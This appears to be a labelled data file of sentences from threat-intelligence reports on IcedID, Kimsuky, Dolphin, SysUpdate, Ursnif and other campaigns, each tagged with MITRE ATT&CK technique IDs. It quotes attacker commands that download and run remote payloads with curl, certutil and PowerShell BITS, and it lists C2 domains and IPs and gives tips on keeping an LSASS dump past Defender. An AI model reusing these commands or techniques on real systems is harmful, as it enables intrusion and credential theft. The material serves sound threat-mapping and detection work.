"If Avira or Avast are installed, the malware saves the decrypted payload to “%TEMPLATES%\marcoor.dll” and spawns it with the rundll32.exe command with the payload URL.","T1140, T1218.011"
"command: exe %TEMPLATES%\marcoor.dll #1 [payload URL] Otherwise, the malware doesn’t write the payload to the file and injects the fetched payload into the explorer.exe process.",T1055
"Additionally, we observed the download and launch of a suspicious batch file.","T1105, T1059.003"
This script is for executing the PowerShell script via,T1053.005
"a Windows scheduled task.WScript.exe ""%system32%\SyncAppvPublishingServer.vbs"" ""n;cmd.exe '/c curl perseus.bond/Dgy_0dU08lC/hCHEdlDFGV/P89bXhClww/uiOHK5H35B/bM%3D -A cur1-agent -o %public%\regsile.bat & start /b",T1053.005
We also observed the context around that batch file in our telemetry.,T1059.003
The batch file name is “What is Blockchain.bat“.,T1059.003
We acquired the scriptlet of the batch file.xcopy /h,T1059.003
The Blockchain.pdf file is a malicious HTML application file spawned by the mshta.exe process.,T1027
"Unfortunately, we don’t have the HTA script (Blockchain.pdf), but we can assume the functionality of the script based on our telemetry – showing the decoy document and fetching the next stage payload.",T1105
# Create a decoy password file and open it.,T1059.003
"cmd.exe"" /c",T1059.003
"echo {PASSWORD}>%documents%\Userlink & notepad.exe %documents%\Userlink # Fetch the payload with cURL command and execute. cmd.exe"" /c","T1105, T1059.003"
This malware (MD5 087407551649376d90d1743bac75aac8) spawns a fake password file while fetching a remote payload and executing it.,T1105
"Upon execution, it creates a fake file (wae.txt) to show a password composed of the string ‘password’ and fetches a payload from the embedded URL and loads it.",T1105
"Usually, the password contains the password needed to open the supplied encrypted decoy document.",T1027
Simple downloader with fake password file It’s possible that the actor delivered the above Windows executable file in archive file format or disk image file format with an encrypted decoy document.,T1027
The campaigns used a variety of email attachments such as Microsoft OneNote attachments and somewhat rare to see .URL,T1566.001
"attachments, which led to the Forked variant of IcedID.",T1566.001
This campaign began with thread hijacked emails which contained HTML attachments.,T1566.001
"The HTML attachments used HTML Smuggling to drop a password protected, zipped Windows Script File (WSF).",T1027
The WSF ran a VBScript which initiated a PowerShell command to download and execute an intermediate script which then downloaded and executed the Standard IcedID Loader using a non-standard export “init”.,T1105
"When opened, the OneNote document instructed the recipient to ""open"" the document by double-clicking the button displayed in the OneNote document.",T1204.002
"An HTML Application (HTA) file was concealed beneath the ""open"" text which, if clicked, executed the HTA file.",T1204.002
The HTA file initiated a PowerShell command used to download and execute an IcedID loader.,T1105
If the .URL file was opened it would initiate the download of a batch (.bat) file.,"T1105, T1059.003"
"The batch file would download and execute an IcedID loader with rundll32 using a non-standard export: ""PluginInit"".","T1105, T1059.003, T1218.011"
The domain is decrypted from the configuration and the URI path is decrypted within the function that makes the HTTP request.,"T1140, T1071.001"
Figure 15: Config decryption within IcedID Lite Loader.,T1140
Figure 16: Decryption of the URI within the IcedID Lite Loader.,T1140
"Loader Analysis Field Standard Loader Forked Loader Internal name loader_dll_64.dll Loader.dll FileType Standard DLL COM Server Extraneous string Contains “1.bin” Project ID Project ID differs from loader to bot Project ID is the same across loader and bot Rough size ~36KB ~48KB Botpack decryption Decryption is the same across both As far as behavior is concerned, the Forked Loader functions the same as the Standard Loader.",T1140
"Before this happens though, the Forked Loader decrypts and copies strings into global variables where they will be later used to resolve required functions.",T1140
This pattern of decrypting strings for future use will come up later in the analysis of the DLL loader.,T1140
Figure 17: String decryption of the DLL names used within the Forked Loader.,T1140
"With the DLL strings decrypted, the malware then decrypts the loader configuration by taking the first 64 bytes and XORing it against the next 64 bytes.",T1140
The first four bytes of the decrypted buffer will contain the project identifier (ID) (a campaign identifier of sorts) and then a singular domain which is used to gate the download of the bot. Figure 18: Decryption of the config buffer in the Forked Loader.,T1140
"With the config decrypted, the malware creates the cookies that contain the host information and sends an HTTP request that will contain the encrypted bot response.","T1071.001, T1140, T1082"
Figure 19: Raw response from the loader C2 containing the encrypted bot and DLL loader.,"T1027, T1140"
"The response gets decrypted with the IcedID decryption routine, then split into the encrypted bot (being “license.dat”) and the custom DLL loader which is generally some randomly generated filename ending in .tmp.",T1140
"DLL Loader Analysis Field Standard DLL Loader Forked DLL Loader Extraneous code Contains code to decrypt strings and domains related to the “lite loader” File type Standard DLL COM Server Internal name init_dll_64.dll Init.dll Rough size 20KB 36KB The start of the DLL loader is the same across both versions of the DLL loader, a thread is created that contains the malicious code for custom loading license.dat: Figure 20: Start of the Standard DLL Loader.",T1140
This function decrypts strings that originally just existed in the Lite Loader. Figure 22:,T1140
"Just like the Forked Loader, the Forked DLL Loader decrypts the DLL strings to be used later to resolve handles to the DLLs needed.",T1140
The strings are decrypted in the same algorithm where the data is split into DWORDs and XOR’d against a random key.,T1140
Figure 23: String decryption for the DLL names needed for execution.,T1140
"Next, a function is called that decrypts strings that are not used at any point within the binary itself.",T1140
"This structure contains two domains and various URIs that could potentially be used to get a separate version of the bot. Figure 24: Decryption of “Lite Loader”"" domains.",T1140
"For all the Forked DLL Loader variants we have seen, there are two domains that are decrypted: “tourdeworldsport[.]com” and “handsinworld[.]com”.",T1140
"The other domain “tourdeworldsport”, also started resolving to the IP “5[.]61[.]34[.]46” on 18 Nov 2022.",T1140
"With the domain names decrypted, the DLL Loader decrypts 10 strings that should be URIs to be appended to the domains.",T1140
Figure 25: Decryption of “Lite Loader” filenames.,T1140
This is the same URI structure (/botpack.dat) that the Lite Loader used to download the bot and DLL loader from the C2 in November 2022 when it was dropped via Emotet infections.,T1140
"After the strings are decrypted, the structure referencing them is never used again.",T1140
Authorization: Basic OTk4MDc1MzAwOjA6MTE5OjY1OjM1 998075300:0:119:65:35 Base64 decoding this value gives up the version as the third component of the list.,T1140
"For the Standard IcedID Bot, this value is set to 119 as seen above, but for the Forked variant, we get the following base64 decoded header; 998075300:0:111:67:1",T1140
Figure 30: Commandline output showing the decrypted botpack structure.,T1140
"At the time when this distribution URL was live the IP was hosting an open directory on /webdav/ that contained various bat files, a forked IcedID loader as well as this lite loader.",T1059.003
"Kimsuky engages in extensive email correspondence and uses spoofed URLs, websites imitating legitimate web platforms, and Office documents weaponized with the ReconShark malware.",T1566.001
Kimsuky may also deliver a weaponized Office document that executes the ReconShark reconnaissance malware.,T1566.001
"Google document The spoofed destination of the URL redirects the target to an attacker-created website that masquerades as a legitimate Google Docs site for requesting document access, such as https[://]drive-google[.]shanumedia[.]com/pdf/ul/ji78fghJHKtgfLKJIO/s2.php?menu=ZGFu[...]vbQ== The Base-64 encoded segment, that is, the value of the menu URL query parameter, resolves to the target’s email address.",T1027
"During conversations with targeted individuals, Kimsuky also seizes any available opportunity to distribute password-protected weaponized Office documents that deploy the ReconShark reconnaissance malware.",T1566.001
"ReconShark exfiltrates information relevant for conducting subsequent precision attacks, such as deployed detection mechanisms and hardware information.",T1082
The Kimsuky group is known to use this tool for remote management of its infrastructure.,T1219
"We detected webshells, mostly obfuscated, being dropped to Exchange servers.",T1027
Another notable feature is that the hacker also changes the content of the file RedirSuiteServiceProxy.aspx to webshell content.,T1036.005
RedirSuiteServiceProxy.aspx is a legitimate file name available in the Exchange server.,T1036.005
"FileName Path RedirSuiteServiceProxy.aspx C:\ProgramFiles\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth Xml.ashx C:\inetpub\wwwroot\aspnet_client pxh4HG1v.ashx C:\ProgramFiles\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth During the incident response process at another customer, GTSC noted that the attack team used another webshell template Filename: errorEE.aspx SHA256: be07bd9310d7a487ca2f49bcdaafb9513c0c8f99921fdf79a05eaba25b52d257 Ref: https://github.com/antonioCoco/SharPyShell Command Execution Besides collecting information on the system, the attacker downloads files, and checks connections through certutil, which is a legitimate tool available in the Windows environment.","T1105, T1005, T1059.003"
"“cmd” /c cd /d ""c:\\PerfLogs""&certutil.exe -urlcache -split -f",T1059.003
"[S]&cd&echo [E] ""cmd"" /c cd /d ""c:\\PerfLogs""&certutil.exe -urlcache -split -f",T1059.003
"In addition, the hacker also injects malicious DLLs into the memory, drops suspicious files on the attacked servers, and executes these files through WMIC.","T1105, T1055, T1047"
"Unfortunately, during the response process, the above files no longer exist on the compromised system, possibly due to the hacker’s evidence deletion.",T1027
The cm.exe file that is dropped into the C:\PerfLogs\ folder is the standard Windows command line tool cmd.exe.,T1059.003
"Specifically: The Run class creates a listener that listens for connections to port 443 at the path https://*:443/ews/web/webconfig/. After listening, the malware creates a new thread that calls to r. Method r does: - Check whether the received request has data in the body or not, if not then returns result 404.",T1071.001
"i does: - Decrypt the request received using AES algorithm where the first 16 bytes of the request are the IV value, the next 16 bytes are the key value, the rest are the data.",T1140
"- After decoding, get the first element in the array as a flag to handle the defined cases as follows: o Case 0: Call to method info.",T1140
This method is responsible for collecting system information.,T1082
"Information such as operating system architecture, framework version, operating system version, etc.",T1082
"The array array3 will take the first 2 elements as parameters for method r, which is responsible for executing the command o Case 3: Call to method ld, which is responsible for listing directory and file information in the format D|-|<Date created> |<Date modified> |<folder or file name> o Case 4: Call to method wf, which is responsible for writing files o Case 5: Call to method rf, which is responsible for reading files o Case 6: Create a folder o Case 7: Delete file or folder o Case 8: Moving file o","T1083, T1070.004"
Victim 1: https://*:443/ews/web/webconfig/ https://*:443/owa/auth/webcccsd/ https://*:444/ews/auto/ https://*:444/ews/web/api/ Victim 2: http://*:80/owa/auth/Current/script/ https://*:443/owa/auth/Current/script/ GTSC also detected that the DLL was injected into the memory of the svchost.exe process.,T1055
Sending and receiving data with C2 using the RC4 encryption algorithm where the key will be generated at runtime.,T1573.001
GlobeImposter’s Delivery Methods Explained GlobeImposter is most often delivered via phishing email as an attachment or a link to a malicious attachment.,T1566.001
The archives often include a JavaScript (.js) file that downloads and executes the GlobeImposter payload.,T1027
"MERCURY likely exploited known vulnerabilities in unpatched applications for initial access before handing off access to DEV-1084 to perform extensive reconnaissance and discovery, establish persistence, and move laterally throughout the network, oftentimes waiting weeks and sometimes months before progressing to the next stage.",T1190
Microsoft assesses that MERCURY gains access to the targets through remote exploitation of an unpatched internet-facing device.,T1190
"Early activities, related attacker tools and techniques Microsoft assesses with moderate confidence that the threat actors attempted several times and succeeded to perform initial intrusion leveraging exposed vulnerable applications, for example, continuing to exploit Log4j 2 vulnerabilities in unpatched systems in July 2022.",T1190
"Installing web shells Adding a local user account and elevating privileges to local administrator Installing legitimate remote access tools, such as RPort, Ligolo and eHorus Installing a customized PowerShell script backdoor Stealing credentials Once the persistence is established, the threat actors perform extensive discovery leveraging common native Windows tools and commands such as netstat and nltest.","T1016, T1219"
Such reconnaissance activities were seen leveraged throughout the attack chain.,T1078
The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment.,T1078
"These actions mainly involved: Remote scheduled tasks to launch their customized PowerShell backdoor Windows Management Instrumentation (WMI) to launch commands on devices Remote services to run encoded PowerShell commands After infecting the new devices, the threat actors often installed the same persistence mechanisms as described above.","T1047, T1053.005"
"On-premises destructive impact In observed activity, the threat actors leveraged highly privileged credentials and access to domain controllers on on-premises destructive operations to prepare for large-scale encryption of targeted devices.",T1078
"To do so, they first interfered with security tools using Group Policy Objects (GPO).",T1484.001
"With defenses impaired, the threat actors proceeded to stage the ransomware payload in the NETLOGON shares on several domain controllers.",T1484.001
GPO was leveraged again to register a scheduled task used to launch the ransomware payload.,"T1484.001, T1053.005"
"On-premises attack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.",T1078
"Two weeks before the ransomware deployment, the threat actors first used a compromised, highly privileged account to access the device where the Azure Active Directory (Azure AD) Connect agent is installed.",T1078
The threat actors then used these credentials to pivot from the on-premises environment to the Azure AD environment.,T1078
"Extracting credentials Two weeks before the ransomware deployment, the threat actors were observed using compromised credentials to access the Azure AD Connect device.",T1078
"Shortly before the ransomware deployment, we observed authentication from a known attacker IP address into the Azure AD Connector cloud account.",T1078
"Cloud destructive impact On the day of the ransomware attack, the threat actors executed multiple actions in the cloud using two privileged accounts.",T1078
"The first account was the compromised Azure AD Connector account, which had Global Administrator permissions as it was set up for an old solution (DirSync).",T1078
"For the second account, which also had Global Administrator permissions, the threat actors leveraged RDP for access into the account.",T1021.001
"Even though this account had MFA in place, the threat actors accessed it through RDP, which is an open session that evades MFA blocking their activities.",T1021.001
"Pivoting to the cloud Mass Azure resource deletion On the same day, a successful sign-in to the Microsoft Azure environment was observed.",T1078
"The Azure AD Connector account and the compromised administrator account were then used to perform significant destruction of the Azure environment—deleting within a few hours server farms, virtual machines, storage accounts, and virtual networks.",T1078
"Email impersonation The threat actors used the compromised administrator account to grant SMTP Send on behalf permissions to the Azure AD Connector account over a high-ranking employee’s mailbox, using the Set-Mailbox PowerShell cmdlet. Figure 6.",T1078
"Note: Those files will still get executed, if the user clicks on run!",T1204.002
"Further notes Full path to file and hidden files By supplying a full path like dbexport.zip\app.jar to the explorer location bar, the binary will immediately be executed.",T1564.001
"LSASS Dump A side effect of the WebDAV is, that the Defender is not going to delete files correctly on that shared folder.",T1003.001
As LSASS dumps are nowadays recognized by the dump file itself this is a nice way to get your hands on the file.,T1003.001
"This will still trigger an alarm, so absolutely not OPSEC!",T1003.001
LSASS dump in c:\tmp detected and deleted,T1003.001
"Oh oh, something wrong with defender Something wrong for the Defender LSASS dump in the WebDAV detected, but file not deleted If you even want to improve this workflow, there is a great tool called PowerHub offering a BlackHole WebDAV, meaning the server will immediately move the file out of the WebDAV.",T1003.001
"To start the loading chain after installation, it creates a one-time scheduled task.",T1053.005
"Step 1, the Python script, reads a specified file, XOR-decrypts its contents, and executes the resulting shellcode.",T1140
"Step 2, shellcode, creates a host process (random CLI executable from %WINDIR%\System32\*.exe), XOR-decrypts further shellcode carried within itself, and injects it into the created process.","T1055, T1140"
"Step 3, another shellcode, XOR-decrypts an embedded PE file – the Dolphin backdoor – and loads and executes it using a custom PE loader.","T1055, T1140"
"We named the backdoor Dolphin based on a PDB path found in the executable: D:\Development\BACKDOOR\Dolphin\x64\Release\Dolphin.pdb Persistence The backdoor periodically checks and creates its own persistence by making sure that Step 1 of the loader is run every time the system is started, via a registry Run value, in the same way as in the installer: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<random_run_name>\”%appdata%\Python27({32|64})\pythonw.exe” “<loader_step_1>” “<loader_encrypted_step_2>” Capabilities The following basic information about the computer and the backdoor is collected: Current backdoor configuration Username Computer name Local and external IP address List of installed security products RAM size and usage Result of check for debugger and other inspection tools (such as Wireshark) OS version Current time Malware version Dolphin downloads commands, issued by its operators, from Google Drive storage and executes them.","T1082, T1033, T1547.001, T1518.001, T1016"
"After execution, the output of commands is uploaded.",T1041
"File exfiltration By default, Dolphin searches all non-fixed drives (USBs), creates directory listings and exfiltrates files by extension.",T1083
"This search can be extended to fixed drives (HDDs), via dedicated commands.",T1005
"The following file extensions of interest, specific to media, documents, emails, and certificates, are specified in the default configuration: jpg, doc, xls, ppt, hwp, url, csv, pdf, show, cell, eml, odt, rtf, nxl, amr, 3gp, m4a, txt, msg, key, der, cer, docx, xlsx, pptx, pfx, mp3 Besides this automatic search, specific files can be exfiltrated.",T1005
"The command to get specific files was improved, by caching/storing it in the configuration until completion.",T1083
It creates directory listings and exfiltrates files.,T1083
Keylogging and screenshots Dolphin logs keystrokes for windows with titles containing substrings specified in its configuration.,T1056.001
"This is done via the GetAsyncKeyState API, with keystrokes being logged along with the window name and current time.","T1106, T1056.001"
Screenshots are also taken at a configurable interval; the default is once every 30 seconds.,T1113
"Screenshots and keylogging are enabled by default, and can be toggled via a command.","T1113, T1056.001"
"The shellcode is stored in the registry, under one of the following keys: HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Classic\<random_number> HKCU\Software\Microsoft\OneDrive\Update\<random_number> HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\HttpsSoftware\Microsoft\Internet Explorer\Zone\<random_number> (two subkeys as one, likely a coding error)",T1112
It can be executed either locally or in a specified separate process that is created and injected.,T1055
"In the newer versions, the shellcode is stored in files instead of the registry, and the stored shellcode is loaded and executed on Dolphin’s startup, which was not the case in version 1.9 (the original version we analyzed).",T1547.001
Shell commands Dolphin can execute shell commands; this is done via the popen API and their output is retrieved.,"T1106, T1059.003"
"First, it enables access to Gmail via the IMAP protocol by sending an HTTP POST request to: https://mail.google.com/mail/u/0/?ik=<GM_ID_KEY>&at=<GM_ACTION_TOKEN>&view=up&act=prefs",T1071.001
"Data staging Dolphin exfiltrates data to Google Drive storage, staging the data in encrypted ZIP archives before upload.","T1041, T1074.001"
"The content is encrypted using AES CBC with random 16-byte keys and IVs, which are stored at the file’s beginning.",T1027
An example of a decrypted configuration is shown in Figure 3.,T1140
"It contains, among others, the following: Encryption keys Credentials for Google Drive API access Window titles to keylog List of file extensions to exfiltrate Dolphin evolution Since the initial discovery of Dolphin in April 2021, we have observed multiple versions of the backdoor, in which the threat actors improved the backdoor’s capabilities and made attempts to evade detection.",T1056.001
Most strings in this version are base64 encoded.,T1027
The base64-encoded strings were plaintext again in this version.,T1027
We observed the following additional changes: Command to steal credentials restored in a different form; it now executes shellcode from the C&C Command to get files from portable devices completely removed Command to get files from drives is now cached/stored in the configuration until completion.,T1083
"After being deployed on selected targets, it searches the drives of compromised systems for interesting files and exfiltrates them to Google Drive.","T1041, T1083"
APIDolphin uses Windows API functions to execute files and inject processes.,"T1106, T1055"
PersistenceT1053.005Scheduled Task/Job: Scheduled TaskDolphin uses a temporary scheduled task to start after installation. T1547.001Boot or Logon Autostart Execution: Registry Run Keys / Startup FolderDolphin uses Run keys for persistence of its loader.,"T1547.001, T1053.005"
T1027Obfuscated Files or InformationDolphin has encrypted components.,T1027
T1083File and Directory DiscoveryDolphin can obtain file and directory listings.,T1083
T1518.001Software Discovery: Security Software DiscoveryDolphin obtains a list of installed security software.,T1518.001
"T1082System Information DiscoveryDolphin obtains various system information including OS version, computer name and RAM size.",T1082
T1016System Network Configuration DiscoveryDolphin obtains the device’s local and external IP address.,T1016
T1033System Owner/User DiscoveryDolphin obtains the victim’s username.,T1033
KeyloggingDolphin can log keystrokes.,T1056.001
T1005Data from Local SystemDolphin can collect files from local drives.,T1005
T1074.001Data Staged: Local Data StagingDolphin stages collected data in a directory before exfiltration.,T1074.001
CaptureDolphin can capture screenshots.,T1113
Command and ControlT1071.001Application Layer Protocol: Web ProtocolsDolphin uses HTTPS to communicate with Google Drive.,T1071.001
T1567.002Exfiltration Over Web Service: Exfiltration to Cloud StorageDolphin exfiltrates data to Google Drive.,T1041
"Loading process We observed the loading process entailing the following steps: The attacker runs rc.exe, a legitimate “Microsoft Resource Compiler” signed file , which is vulnerable to a DLL side-loading vulnerability, and loads a file named rc.dll.",T1574.002
The rc.bin file is a Shikata Ga Nai encoded shellcode that decompresses and loads the first stage in memory.,"T1027, T1140"
"Depending on the number of command line parameters, different actions are performed: Zero or two parameters: “Installs” the malware in the system, and calls Stage 1 again via process hollowing with four parameters One parameter: Same as previous action but without the “installation” Four parameters: Creates a memory section with the DES-encrypted malware configuration and a second Shikata Ga Nai shellcode decompressing and loading Stage 2.","T1027, T1055, T1140"
It then runs Stage 2 via process hollowing.,T1055
"Depending on the privileges of the process, the malware either creates a registry key or a service that launches the moved executable rc.exe with one parameter.","T1569.002, T1112"
"Updated SysUpdate loading process routine We saw different legitimate executables being used, sideloading different DLL names, and multiple binary files names being loaded by those DLLs.",T1574.002
We identified the executables and sideloaded files as follows:,T1574.002
SysUpdate’s seemingly legitimate executables and their respective sideloaded files Legitimate application name Certificate signer Side-loaded DLL name Loaded binary file name INISafeWebSSO.exe Initech inicore_v2.3.30.dll inicore_v2.3.30.bin rc.exe Microsoft rcdll.dll rcdll.bin dlpumgr32.exe DESlock DLPPREM32.dll sv.bin GDFInstall.exe UBISOFT ENTERTAINMENT GameuxInstallHelper.DLL sysconfig.bin route-null.exe Wazuh libwazuhshared.dll wazuhext.bin route-null.exe Wazuh libwazuhshared.dll agent-config.bin wazuh-agent.exe Wazuh libwinpthread-1.dll wazuhext.bin We want to highlight that this is the first time we observed a threat actor abusing a sideloading vulnerability in a Wazuh signed executable.,T1574.002
"Malware features Looking at the features, several of the functions found in the latest update are similar to the previous SysUpdate version: Service manager (lists, starts, stops, and deletes services) Screenshot grab Process manager (browses and terminates processes) Drive information retrieval File manager (finds, deletes, renames, uploads, downloads a file, and browses a directory)","T1057, T1070.004, T1105, T1083, T1059.003, T1113"
Command execution Iron Tiger also added a feature that had not been seen before in this malware family:,T1059.003
"C&C communication with DNS TXT records First, the malware retrieves the configured DNS servers by calling the GetNetworkParams API function and parsing the DnsServerList linked list.",T1106
"In all versions, the malware retrieves information on the infected machine and sends it to the C&C encrypted with DES.","T1041, T1573.001"
Collected machine information includes the following: Randomly generated GUID Hostname Domain name Username User privileges Processor architecture Current process ID Operating system version Current file path Local IP address and port used to send the network packet The configuration is encrypted with a hardcoded DES key and is a few bytes long following the structure enumerated below: Table 2.,"T1573.001, T1057, T1082, T1033, T1016"
"= regular C&C 0x01 C&C domain name Variable dev.gitlabs.me Port number 4 0x00000050 Size of next section 4 Next section contains all the hardcoded names (folder, files, registry values) 0x00000034 Name of the hardcoded directory where files are copied Variable The folder is located either in % gtdcfp Name of the executable vulnerable to side loading Variable TextInputHost.exe Name of the malicious side-loaded DLL Variable rc.dll Name of the binary file containing the encoded Stage 1 Variable rc.bin Name of the service or registry key value used for persistence Variable gtdcfp We noted that Stage 2 does not embed the configuration file, which is copied in memory by the previous stage.","T1574.002, T1074.001"
We only saw one case where there was only one stage being decrypted in memory and the configuration was hardcoded.,T1140
"Then, the malware retrieves information on the compromised computer and sends it to the C&C. The following information is sent to the C&C, encrypted with a hardcoded key and DES CBC algorithm: GUID Host name Username Local IP address and port used to send the request Current PID Kernel version and machine architecture Current file path Boolean (0 if it was launched with exactly one parameter, 1 otherwise)","T1041, T1573.001"
The software has been used by multiple APT and cybercrime groups in the past to obfuscate their malware.,T1027
"Interestingly, the threat actor not only signed some of its malicious executables with the stolen certificate, but also used VMProtect to obfuscate one of them.",T1027
It appears that a chat application was used as a lure to entice the victim into opening the malicious file.,T1204.002
"In general, the features were simple; the malware decrypts the saved passwords to a file named “passwords.txt”, and the cookies to a file named “cookies.txt”.",T1140
"It then copies the “Login Data” file to a temporary file “chromedb_tmp”, issues an SQL query to extract the URL, login, and password fields from the file, and then decrypts them and appends the result to the “passwords.txt” file.","T1552.001, T1140"
"It proceeds to copy the “Cookies” file to a temporary file “chromedb_tmp”, extracts multiple fields from it using an SQL query, and then decrypts the content before copying the result to the “cookies.txt” file.",T1140
"The malware displayed an interesting execution flow, which included using a renamed copy of rundll32.",T1218.011
The malware also established persistence on the host with the creation of a registry run key.,T1547.001
"The threat actor first ran some initial discovery on the host using built-in Windows utilities like ipconfig, systeminfo, net, and ping.","T1016, T1082"
"Shortly afterwards, the threat actor injected into various processes and then proceeded to access lsass memory on the host to extract credentials.","T1003.001, T1055"
These files were transferred to the domain controller over SMB.,T1570
"After connecting to the Cobalt Strike beacon on the domain controller, the threat actor executed another round of discovery tasks and dumped lsass memory on the domain controller.",T1003.001
"At that time, the threat actor became active by initiating a proxied RDP connection via the Cobalt Strike beacon to the domain controller.","T1090, T1021.001"
"One host of interest was one of the backup servers, which was logged into, the state of backups were checked and running processes were reviewed before exiting the session.",T1057
"Once mounted, the new drive contained a LNK file 6570872.lnk and hidden folder “me”.",T1564.001
"If we parse this LNK file with LECmd (by Eric Zimmerman), it highlights the execution path and the icon it appears as: The contents of hidden folder “me”, included several files and folders that were used for the execution of Ursnif.",T1564.001
"Of interest, the folder included a legitimate copy of rundll32.exe (renamed to 123.com).",T1218.011
Summary of the files found in 3488164.iso (a detailed break down of these can be found in Execution): File Name Purpose 6570872.lnk LNK file that executes alsoOne.bat me/by Empty folder me/here Empty folder me/123.com Renamed legitimate version of rundll32.exe me/alsoOne.bat Batch script to run canWell.js with specific arguments me/canWell.js Reverses argument strings and executes tslt.db with 123.com me/itslt.db Ursnif DLL or.jpg Image not used.,T1059.003
"Execution Once the user had mounted the ISO and the LNK file was executed by the user, the complex execution flow started.",T1204.002
"Ursnif Malware Highlighted in Initial Access, the LNK file would execute a batch script alsoOne.bat .",T1059.003
"Exec(): me/123.com me/itsIt.db,DllRegisterServer Using the SRUM database, we were able to determine that the custom rundll32.exe binary downloaded approximately 0.4 MB of data.",T1218.011
"; Analyst Note: The names of the registry values changed when we ran the payload in a sandbox during analysis, and hence suspected to be generated at random at execution.",T1112
The last registry key was used to store additional PowerShell code.,T1112
"This script called a combination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc to perform process injection of shellcode stored in Base64.","T1027, T1106, T1055"
"@""C:\Users\<REDACTED>\AppData\Local\Temp\npfdesjp\npfdesjp.cmdline"" Finally, a unique command spawned from the parent explorer.exe process that was called pause.exe with multiple arguments, which appeared to not provide any additional functionality.",T1059.003
"""C:\Windows\syswow64\cmd.exe"" /C pause dll mail, , A sigma rule for this cmdline can be found in the Detections section of this report.",T1059.003
"Cobalt Strike An instance of cmd.exe was launched through explorer.exe which ran the following command: powershell.exe -nop -c ""start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\'",T1059.003
It is possible this explorer.exe ➝ cmd.exe session was through a VNC session.,T1059.003
This PowerShell command started a BITS job to download a Cobalt Strike beacon from 193.201.9[.]199 and saved it with a random name to %TEMP%.,T1105
"Persistence Once the foothold had been achieved, after execution of Ursnif on the beachhead host, persistence was achieved by creating a ‘Run’ key named ManagerText which was configured to execute a LNK file which executed a PowerShell script.",T1547.001
Credential Access We observed a process created by Cobalt Strike accessing lsass.exe.,T1003.001
The GrantedAccess code of 0x1010 is a known indicator of such tools as Mimikatz.,T1003.001
"""reg.exe query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"" /s >>",T1012
"C:\Users\<REDACTED>\AppData\Local\Temp\BD2C.bin1"" Manual discovery Once the threat actor had Cobalt Strike running on the beachhead host, they ran the following commands: whoami whoami /groups time ipconfig /all systeminfo The threat actor quickly took interest in a support account.","T1016, T1082"
net user <REDACTED>,T1059.003
"The threat actor also used a batch script to collect a list of all computer objects on the domain using C:\Windows\system32\cmd.exe /C adcomp.bat which contained the PowerShell command: powershell Get-ADComputer -Filter * -Properties Name,Operatingsystem, OperatingSystemVersion, OperatingSystemServicePack,IPv4Address >> log2.txt During the final actions taken by the threat actors before eviction, after completing RDP connections to various hosts on the network, the threat actors checked running processes on the accessed hosts via taskmanager, which were started via their interactive RDP session as noted by the /4 command line argument.","T1057, T1059.003, T1021.001"
C:\Windows\system32\taskmgr.exe /4 Lateral Movement WMI was used to pivot to a domain controller on the network.,T1047
"The actor leveraged Impacket’s wmiexec.py to execute commands with a semi-interactive shell, most likely using credentials gathered by the previous LSASS access.","T1083, T1047, T1003.001"
"The commands executed included directory traversal, host discovery, and execution of tools on the DC.",T1083
"As Impacket interacts with remote endpoints via WMI over TCP via DCERPC, its possible to inspect network level packets: The use of Impacket by threat actors has been recently detailed by the US CERT in alert AA22-277A – Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization.","T1047, T1005"
We can observe a number of WMI requests via DCERPC from one endpoint to a target endpoint based on the ports.,T1047
Correlating the network activity to the host activity confirms that the ‘Powershell.exe’ process initiated the WMI requests.,T1047
13Cubed (Richard Davis) also released an amazing resource to investigate Impacket related incidents here: https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet_poster.pdf One of the observed commands invoked via WMI was ‘firefox.exe’.,T1047
"The process generated a significant volume of network connections to 193.201.9[.]199, averaging ~6K requests per hour, equating to >150K connections throughout the duration of the intrusion.",T1021.001
RDP was also used by the threat actor on the final two days of the intrusion to connect to various hosts from a domain controller proxying the traffic via the firefox.exe Cobalt Strike beacon. Command and Control Ursnif Ursnif was seen using the following domains and IPs: 5.42.199.83superliner.top 62.173.149.7 internetlines.in 31.41.44.97 superstarts.top 31.41.44.27 superlinez.top 31.41.44.27 internetlined.com 208.91.197.91 denterdrigx.com: 187.190.48.135 210.92.250.133 189.143.170.233 201.103.222.246 151.251.24.5 190.147.189.122 115.88.24.202 211.40.39.251 187.195.146.2 186.182.55.44 222.232.238.243 211.119.84.111 51.211.212.188 203.91.116.53 115.88.24.203 190.117.75.91 181.197.121.228 190.167.61.79 109.102.255.230 211.119.84.112 190.107.133.19 185.95.186.58 175.120.254.9 46.194.108.30 190.225.159.63 190.140.74.43 187.156.56.52 195.158.3.162 138.36.3.134 109.98.58.98 24.232.210.245 222.236.49.123 175.126.109.15 124.109.61.160 95.107.163.44 93.152.141.65 5.204.145.65 116.121.62.237 31.166.129.162 222.236.49.124 211.171.233.129 211.171.233.126 211.53.230.67 196.200.111.5 190.219.54.242 190.167.100.154 110.14.121.125 58.235.189.192 37.34.248.24 110.14.121.123 179.53.93.16 175.119.10.231 211.59.14.90 188.48.64.249 187.232.150.225 186.7.85.71 148.255.20.4 91.139.196.113 41.41.255.235 31.167.236.174 189.165.2.131 1.248.122.240 We also observed several modules for Ursnif downloaded from the following IP:,"T1090, T1021.001"
"Exfiltration Several HTTP Post events were observed to the identified domains denterdrigx[.]com, superliner[.]top and 5.42.199[.]83, masquerading as image uploads.",T1071.001
"The user agent ‘Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64)’, an unusual browser configuration to masquerade as, which indicates use of Internet Explorer 8.0 (that was released ~2009).",T1071.001
The POST event included a MIME part indicating file upload activity,T1071.001
The example HTTP stream containing the content The file that was uploaded 775E.bin was deleted by the injected ‘Explorer.exe’ process from the target endpoint in folder ‘\Users\<REDACTED>\AppData\Local\Temp’,"T1027, T1071.001"
"In this example, the mix of activity can be observed as: Impact The threat actor was able to RDP to a backup server using the admin credentials they acquired.","T1021.001, T1078"
